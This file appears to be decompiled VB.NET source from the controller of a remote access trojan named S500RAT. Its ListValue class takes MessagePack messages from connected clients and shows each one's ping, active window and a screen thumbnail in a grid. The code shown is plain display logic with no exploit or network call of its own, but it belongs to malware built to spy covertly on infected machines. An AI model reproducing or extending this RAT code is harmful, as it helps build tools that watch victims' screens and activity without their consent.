Imports System
Imports System.Drawing
Imports System.IO
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200006F RID: 111
	Public Class ListValue
		' Token: 0x060011FF RID: 4607 RVA: 0x000A3080 File Offset: 0x000A1280
		Public Shared Sub Ping(Client_0 As Clients, unpack_msgpack As MsgPack)
			Try
				Dim flag As Boolean = Client_0.L Is Nothing
				If Not flag Then
					Dim asString As String = unpack_msgpack.ForcePathObject("Ping").AsString
					Dim flag2 As Boolean = Conversions.ToDouble(asString) > 400.0
					If flag2 Then
						Client_0.L.Cells(13).Value = DataB.form1_0.IsAdmin.Images("0.png")
					Else
						Dim flag3 As Boolean = Conversions.ToDouble(asString) > 300.0
						If flag3 Then
							Client_0.L.Cells(13).Value = DataB.form1_0.IsAdmin.Images("1.png")
						Else
							Dim flag4 As Boolean = Conversions.ToDouble(asString) > 200.0
							If flag4 Then
								Client_0.L.Cells(13).Value = DataB.form1_0.IsAdmin.Images("2.png")
							Else
								Client_0.L.Cells(13).Value = DataB.form1_0.IsAdmin.Images("3.png")
							End If
						End If
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06001200 RID: 4608 RVA: 0x000A31F4 File Offset: 0x000A13F4
		Public Shared Sub Active(Client_0 As Clients, unpack_msgpack As MsgPack)
			Try
				Dim flag As Boolean = Client_0.L Is Nothing
				If Not flag Then
					Client_0.L.Cells(14).Value = unpack_msgpack.ForcePathObject("Active").AsString
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06001201 RID: 4609 RVA: 0x000A325C File Offset: 0x000A145C
		Public Shared Sub ScreenList(Client_0 As Clients, unpack_msgpack As MsgPack)
			Try
				Dim asBytes As Byte() = unpack_msgpack.ForcePathObject("stream").GetAsBytes()
				Dim flag As Boolean = Client_0.L Is Nothing
				If Not flag Then
					Dim flag2 As Boolean = asBytes.Length < 10
					If Not flag2 Then
						Client_0.L.Cells(0).Value = Image.FromStream(New MemoryStream(asBytes))
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
